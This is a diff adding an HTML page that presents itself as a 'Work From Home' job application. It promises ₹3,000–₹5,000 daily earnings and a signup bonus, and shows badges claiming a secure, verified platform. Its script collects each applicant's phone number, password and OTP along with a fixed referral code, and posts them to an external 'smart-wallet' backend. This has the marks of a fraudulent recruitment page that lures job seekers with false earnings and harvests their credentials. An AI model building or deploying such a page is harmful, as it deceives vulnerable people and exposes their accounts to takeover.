@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Work From Home | Job Application</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Font -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+/* RESET */
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:'Inter',sans-serif;
+}
+
+/* BODY */
+body{
+  background:linear-gradient(135deg,#020617,#1e3a8a,#2563eb);
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+/* MAIN CARD */
+.app{
+  width:100%;
+  max-width:420px;
+  background:#fff;
+  border-radius:26px;
+  box-shadow:0 30px 70px rgba(0,0,0,0.45);
+  overflow:hidden;
+  animation:fade 1s ease;
+}
+
+@keyframes fade{
+  from{opacity:0;transform:translateY(25px)}
+  to{opacity:1;transform:translateY(0)}
+}
+
+/* HEADER */
+.header{
+  background:linear-gradient(135deg,#1e40af,#38bdf8);
+  color:#fff;
+  padding:35px 22px;
+  text-align:center;
+}
+
+.header h1{
+  font-size:24px;
+  font-weight:700;
+}
+
+.header span{
+  color:#ffe600;
+}
+
+.header p{
+  font-size:13px;
+  margin-top:8px;
+  opacity:0.95;
+}
+
+/* BONUS BADGE */
+.badge{
+  background:linear-gradient(135deg,#22c55e,#16a34a);
+  display:inline-block;
+  margin-top:12px;
+  padding:6px 16px;
+  border-radius:20px;
+  font-size:12px;
+  font-weight:600;
+  box-shadow:0 6px 15px rgba(0,0,0,0.25);
+}
+
+/* STATS */
+.stats{
+  display:flex;
+  justify-content:space-around;
+  margin-top:20px;
+}
+
+.stat{
+  background:rgba(255,255,255,0.15);
+  padding:10px 12px;
+  border-radius:12px;
+  font-size:11px;
+}
+
+/* FORM AREA */
+.form-area{
+  padding:25px;
+}
+
+/* TITLE */
+.title{
+  text-align:center;
+  margin-bottom:18px;
+}
+
+.title h3{
+  font-size:18px;
+}
+
+.title p{
+  font-size:12px;
+  color:#555;
+}
+
+/* FIELD */
+.field{
+  margin-bottom:14px;
+}
+
+.field label{
+  font-size:12px;
+  font-weight:600;
+  color:#444;
+}
+
+.field input{
+  width:100%;
+  margin-top:6px;
+  padding:12px;
+  border-radius:10px;
+  border:1px solid #ddd;
+  font-size:14px;
+  transition:0.3s;
+}
+
+.field input:focus{
+  outline:none;
+  border-color:#2563eb;
+  box-shadow:0 0 0 2px rgba(37,99,235,0.15);
+}
+
+/* CAPTCHA */
+.captcha-box{
+  display:flex;
+  gap:8px;
+  align-items:center;
+}
+
+.captcha-img{
+  background:#f1f5f9;
+  padding:10px;
+  border-radius:8px;
+  font-weight:700;
+  color:#1e40af;
+  min-width:70px;
+  text-align:center;
+}
+
+/* OTP BUTTON */
+.otp-btn{
+  width:100%;
+  padding:12px;
+  border:2px solid #2563eb;
+  background:#fff;
+  color:#2563eb;
+  border-radius:10px;
+  font-weight:600;
+  cursor:pointer;
+  transition:0.3s;
+  margin-bottom:12px;
+}
+
+.otp-btn:hover{
+  background:#2563eb;
+  color:#fff;
+}
+
+/* SUBMIT */
+.submit-btn{
+  width:100%;
+  padding:14px;
+  background:linear-gradient(135deg,#22c55e,#16a34a);
+  border:none;
+  border-radius:14px;
+  color:#fff;
+  font-size:15px;
+  font-weight:700;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+.submit-btn:hover{
+  transform:translateY(-2px);
+  box-shadow:0 10px 22px rgba(34,197,94,0.45);
+}
+
+/* MESSAGE */
+#msg{
+  text-align:center;
+  margin-top:10px;
+  font-size:13px;
+  font-weight:600;
+}
+
+.ok{color:#16a34a}
+.err{color:#dc2626}
+
+/* TRUST */
+.trust{
+  background:#f8fafc;
+  padding:14px;
+  text-align:center;
+  font-size:12px;
+  color:#555;
+}
+
+/* FOOTER */
+.footer{
+  text-align:center;
+  font-size:11px;
+  color:#888;
+  margin:15px 0 20px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+  <!-- HEADER -->
+  <div class="header">
+
+    <h1>Work From <span>Home</span></h1>
+
+    <p>
+      Job Application • Earn From Mobile
+      <br>
+      ₹3,000 – ₹5,000 Daily Easily
+    </p>
+
+    <div class="badge">
+      🎁 Newbie Bonus ₹150
+    </div>
+
+    <div class="stats">
+
+      <div class="stat">💼 Online Job</div>
+      <div class="stat">📱 Mobile Work</div>
+      <div class="stat">💰 Weekly Pay</div>
+
+    </div>
+
+  </div>
+
+  <!-- FORM -->
+  <div class="form-area">
+
+    <div class="title">
+      <h3>Apply Now</h3>
+      <p>Complete registration to get mentor access</p>
+    </div>
+
+    <form id="f">
+
+      <!-- PHONE -->
+      <div class="field">
+        <label>Mobile Number</label>
+        <input type="tel"
+               name="phone"
+               placeholder="+91 Enter mobile number"
+               required>
+      </div>
+
+      <!-- PASSWORD -->
+      <div class="field">
+        <label>Create Password</label>
+        <input type="password"
+               name="password"
+               placeholder="Create secure password"
+               required>
+      </div>
+
+      <!-- CAPTCHA -->
+      <div class="field">
+        <label>Verification Code</label>
+
+        <div class="captcha-box">
+
+          <input type="text"
+                 name="captcha"
+                 placeholder="Enter code"
+                 required>
+
+          <div class="captcha-img" id="cap">
+            A9K4M
+          </div>
+
+        </div>
+      </div>
+
+      <!-- OTP -->
+      <button type="button"
+              class="otp-btn"
+              onclick="sendOtp()">
+        📩 Send OTP
+      </button>
+
+      <div class="field">
+        <label>OTP Verification</label>
+        <input type="text"
+               name="otp"
+               placeholder="Enter OTP"
+               required>
+      </div>
+
+      <!-- INVITE -->
+      <div class="field">
+        <label>Reference Code</label>
+        <input type="text"
+               name="invite"
+               value="INHP6LTO"
+               readonly>
+      </div>
+
+      <!-- SUBMIT -->
+      <button type="submit"
+              class="submit-btn">
+        🚀 Submit Application
+      </button>
+
+    </form>
+
+    <div id="msg"></div>
+
+  </div>
+
+  <!-- TRUST -->
+  <div class="trust">
+    🔒 Secure System • 🎓 Mentor Support • ✅ Verified Platform
+  </div>
+
+  <div class="footer">
+    © 2025 Mahalaxmi Foundation • All Rights Reserved
+  </div>
+
+</div>
+
+<script>
+
+const BACKEND = "https://smart-wallet-hj5j.onrender.com/"; 
+// 👆 CHANGE to your real Render URL
+
+let captcha_id = "";
+let msg_id = "";
+let token = "";
+
+/* Load Captcha */
+async function loadCaptcha(){
+
+ try{
+
+  let r = await fetch(BACKEND + "/captcha");
+  let j = await r.json();
+
+  captcha_id = j.captcha_id;
+
+  // If API sends image
+  if(j.image){
+    cap.innerHTML = "<img src='"+j.image+"' height='40'>";
+  }
+  // If API sends text
+  else if(j.captcha){
+    cap.innerText = j.captcha;
+  }
+
+ }catch{
+  show("Captcha load failed ❌","err");
+ }
+}
+
+/* Send OTP */
+async function sendOtp(){
+
+ if(f.phone.value.length !== 10){
+  show("Enter valid mobile number","err");
+  return;
+ }
+
+ if(f.captcha.value.length < 4){
+  show("Enter captcha first","err");
+  return;
+ }
+
+ let data = {
+  phone: f.phone.value,
+  captcha_code: f.captcha.value,
+  captcha_id: captcha_id
+ };
+
+ try{
+
+  let r = await fetch(BACKEND + "/sendOtp", {
+   method: "POST",
+   headers: { "Content-Type":"application/json" },
+   body: JSON.stringify(data)
+  });
+
+  let j = await r.json();
+
+  msg_id = j.msg_id;
+  token = j.token;
+
+  show("OTP sent successfully ✅","ok");
+
+ }catch{
+  show("OTP sending failed ❌","err");
+ }
+}
+
+/* Register */
+f.onsubmit = async(e)=>{
+ e.preventDefault();
+
+ if(f.otp.value.length < 4){
+  show("Invalid OTP","err");
+  return;
+ }
+
+ let data = {
+  phone: f.phone.value,
+  password: f.password.value,
+  otp: f.otp.value,
+  invitation_code: f.invite.value,
+  msg_id: msg_id,
+  token: token
+ };
+
+ try{
+
+  let r = await fetch(BACKEND + "/register", {
+   method: "POST",
+   headers: { "Content-Type":"application/json" },
+   body: JSON.stringify(data)
+  });
+
+  let res = await r.text();
+
+  show(res,"ok");
+
+ }catch{
+  show("Registration failed ❌","err");
+ }
+};
+
+function show(t,c){
+ msg.innerText = t;
+ msg.className = c;
+}
+
+/* Init */
+loadCaptcha();
+
+</script>
+
+</body>
+</html>
